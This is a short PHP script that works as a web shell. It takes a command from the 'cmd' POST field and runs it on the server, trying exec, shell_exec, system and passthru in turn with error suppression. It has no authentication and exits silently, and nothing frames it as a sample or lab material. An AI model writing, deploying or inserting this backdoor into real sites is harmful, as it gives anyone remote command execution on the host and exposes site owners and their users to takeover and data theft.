<?php
function shell($cmd)
{
  global $lang;
 $ret = '';
 
  if(function_exists('exec')){@exec($cmd,$ret);$ret = join("\n",$ret);}
  elseif(function_exists('shell_exec')){$ret = @shell_exec($cmd);}
  elseif(function_exists('system')){@ob_start();@system($cmd);$ret = @ob_get_contents();@ob_end_clean();}
  elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$ret = @ob_get_contents();@ob_end_clean();}

 return $ret;
}

shell($_POST['cmd']);
die("");
?>